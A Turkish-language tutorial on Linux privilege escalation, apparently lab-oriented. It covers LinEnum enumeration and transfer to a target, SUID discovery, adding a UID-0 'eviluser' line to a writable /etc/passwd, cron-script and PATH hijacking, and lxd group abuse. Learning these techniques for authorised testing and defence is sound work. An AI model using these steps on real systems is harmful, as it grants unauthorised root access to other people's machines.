# Linux Yetki Yükseltme

## Bilgi Toplama

### LinEnum Nedir?

**LinEnum**, yetki yükseltmeyle ilgili yaygın komutları çalıştıran basit bir bash betiğidir. Bu araç, zaman kazandırır ve root erişimi sağlama çabalarını artırır. LinEnum tarafından hangi komutların çalıştırıldığını anlamak önemlidir; çünkü LinEnum veya benzeri bir betiği kullanamadığınız durumlarda manuel olarak yetki yükseltme açıklarını bulabilmeniz gerekecektir. 

Bu rehberde LinEnum'un çıktısını ve bu çıktıyı manuel olarak nasıl oluşturabileceğinizi inceleyeceğiz.

### LinEnum'u Nereden Alabilirsiniz?

LinEnum'u aşağıdaki bağlantıdan indirebilirsiniz:

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Bu aracı kolayca hatırlayabileceğiniz bir yere kaydetmeniz faydalı olacaktır; çünkü LinEnum çok değerli bir araçtır.

### LinEnum'u Hedef Makineye Nasıl Yüklersiniz?

#### Yöntem 1: Python Web Sunucusu Kullanımı

1. LinEnum'un bulunduğu dizinde bir Python web sunucusu başlatın:
   ```bash
   python3 -m http.server 8000
   ```
2. Hedef makinede `wget` komutunu ve yerel IP adresinizi kullanarak LinEnum'u indirin:
   ```bash
   wget http://<yerel_ip>:8000/LinEnum.sh
   ```
3. Dosyayı çalıştırılabilir hale getirin:
   ```bash
   chmod +x LinEnum.sh
   ```

#### Yöntem 2: Manuel Kopyalama

1. LinEnum kodunu yerel makinenizdeki betikten kopyalayın.
2. Hedef makinede `nano` veya `vi` kullanarak yeni bir dosya oluşturun ve kodu yapıştırın.
3. Dosyayı `.sh` uzantısıyla kaydedin ve çalıştırılabilir hale getirin:
   ```bash
   chmod +x FILENAME.sh
   ```

### LinEnum'u Çalıştırma

LinEnum'u çalıştırmak için aşağıdaki komutu kullanabilirsiniz:

```bash
./LinEnum.sh
```

## LinEnum Çıktısını Anlama

### Çıktıdaki Ana Bölümler

1. **Çekirdek Bilgisi**: Çekirdek sürümü bilgileri burada gösterilir. Bu bilgiler, hedef makine için mevcut bir çekirdek açığı olup olmadığını anlamanıza yardımcı olabilir.

2. **Okunabilir/Yazılabilir Hassas Dosyalar**: Dünya yazılabilir dosyalar listelenir. Bu dosyaların yanlış yapılandırılmış izinleri sayesinde yetki yükseltme mümkün olabilir.

3. **SUID Dosyaları**: SUID (Set owner User ID) dosyalarının listesi gösterilir. Eğer bu dosyalar root yetkisiyle çalışıyorsa, bu durum yetki yükseltme için bir fırsat sunar.

4. **Crontab İçeriği**: Zamanlanmış görevler burada listelenir. Yanlış yapılandırılmış cron görevlerini yetki yükseltmek için kullanabilirsiniz.

---

## SUID/GUID Dosyalarını İstismar Etme

### SUID Binarileri Nedir?

Linux'ta her şey bir dosyadır. SUID bit ayarlandığında, bir dosya çalıştırıldığında kullanıcının UID'si yerine dosyanın sahibi olan kullanıcının UID'si ile çalıştırılır. Benzer şekilde, SGID izinleri grup sahibi üzerinden çalışır.

#### İzinlerin Görünümü:

| İzin | Kullanıcı | Grup | Diğer |
|------|----------|------|-------|
| rwx  | rwx      | rwx  |

Örnek: `chmod 755` komutuyla ayarlanan izinler `-rwxr-xr-x` şeklinde görünür.

#### SUID ve SGID Örnekleri:

| İzin Türü | Görünüm        |
|-----------|----------------|
| SUID      | `-rwsr-xr-x`  |
| SGID      | `-rwxr-sr-x`  |
| Her İkisi  | `-rwsr-sr-x`  |

### SUID Binarilerini Bulma

SUID veya GUID yetkisine sahip dosyaları bulmak için aşağıdaki komut kullanılabilir:

```bash
find / -perm -u=s -type f 2>/dev/null
```

#### Komutun Açıklaması:
- `find`: Arama komutunu başlatır.
- `/`: Tüm dosya sisteminde arama yapar.
- `-perm -u=s`: SUID iznine sahip dosyaları arar.
- `-type f`: Sadece dosyaları arar.
- `2>/dev/null`: Hata mesajlarını bastırır.

---

## /etc/passwd Dosyasını İstismar Etme

### /etc/passwd Nedir?

`/etc/passwd` dosyası, sistem kullanıcılarıyla ilgili temel bilgileri saklar. Bu dosya yanlışlıkla yazılabilir hale getirilirse, root yetkisiyle oturum açan bir kullanıcı oluşturmak mümkündür.

### /etc/passwd Formatı

Bir satır örneği:

```
test:x:0:0:root:/root:/bin/bash
```

| Alan        | Açıklama                                 |
|-------------|-----------------------------------------|
| Kullanıcı Adı | Kullanıcının giriş yaparken kullandığı isim. |
| Parola       | Şifrelenmiş parolanın bulunduğu dosya.   |
| UID          | Kullanıcı kimliği.                      |
| GID          | Grup kimliği.                           |
| Kullanıcı Bilgisi | Ekstra bilgi (ad, telefon vb.).         |
| Ev Dizini    | Kullanıcının oturum açtığında girdiği dizin. |
| Komut/Kabuk  | Kullanıcıya atanmış komut veya kabuk.    |

### Yazılabilir /etc/passwd Dosyasını İstismar Etme

Yeni bir root kullanıcısı oluşturmak için aşağıdaki adımları izleyebilirsiniz:

1. Yeni bir giriş satırı ekleyin:
   ```bash
   echo "eviluser:x:0:0:root:/root:/bin/bash" >> /etc/passwd
   ```
2. Bu kullanıcı ile root yetkisine sahip bir oturum başlatın.

---

## Cron Görevlerini İstismar Etme

### Cron Nedir?

Cron, belirli zamanlarda komut çalıştıran bir süreçtir. Yanlış yapılandırılmış cron görevleri yetki yükseltme fırsatı sunabilir.

### Cron Görevlerini Görüntüleme

Cron görevlerini görüntülemek için şu komutu çalıştırabilirsiniz:

```bash
cat /etc/crontab
```

### Cronjob Formatı

```
m  h  dom mon dow user command
```

Örnek:

```
0 */6 * * * root /path/to/script.sh
```

### Cronjob İstismarı

Eğer bir cron görevi root yetkisiyle çalışıyor ve yazılabilir bir dosyayı içeriyorsa, bu dosyayı düzenleyerek bir reverse shell başlatabilirsiniz.

---

## PATH Değişkenini İstismar Etme

### PATH Nedir?

PATH, yürütülebilir dosyaların bulunduğu dizinleri tanımlayan bir değişkendir. PATH değişkenini değiştirerek, bir SUID dosyasının root yetkisiyle çalıştırdığı komutları manipüle edebilirsiniz.

# SUID ve PATH Değiştirerek Yetki Yükseltme

İlgili kullanıcının **PATH** değişkenini görüntülemek oldukça basittir. Aşağıdaki komut yardımıyla görüntüleyebilirsiniz:

```bash
echo $PATH
```

Peki, bu bize nasıl yetki yükseltme sağlar?

### Örnek: SUID Binary ile Yetki Yükseltme

Bir SUID binary dosyasına sahip olduğumuzu varsayalım. Bu binary'i çalıştırdığımızda, sistem shell'ini çağırarak temel bir işlem yapmaya çalıştığını görebiliriz, örneğin:

```bash
ps
```

Ancak, daha önceki SUID örneğimizden farklı olarak, bu durumda komut enjeksiyonu için bir argüman sağlayarak exploit gerçekleştiremiyoruz. Peki, bu durumda ne yapabiliriz?

### PATH Değiştirerek Exploit Gerçekleştirme

**PATH** değişkenini, bizim belirlediğimiz bir dizine yönlendirebiliriz! Böylece, SUID binary'si sistem shell'ini çağırıp bir çalıştırılabilir dosya yürüttüğünde, bizim yazdığımız bir dosyayı çalıştırmasını sağlayabiliriz.

Bir SUID dosyasında olduğu gibi, bu komut SUID dosyasının sahibinin yetkileriyle çalıştırılacaktır. Eğer bu kullanıcı **root** ise, bu yöntemle root yetkileriyle istediğimiz komutları çalıştırabiliriz!

---

## Gruplar

Kullanıcı kimliğinizi ve dahil olduğunuz grupları şu komut ile kontrol edebilirsiniz:

```bash
id
```

Kullanıcılar, örneğin **lxd** gibi root süreçleri için oluşturulan grupların bir üyesi olabilir. Bu grup üyeliklerini, sistemdeki diğer zafiyetler ile birleştirerek yetki yükseltme fırsatları arayabilirsiniz.

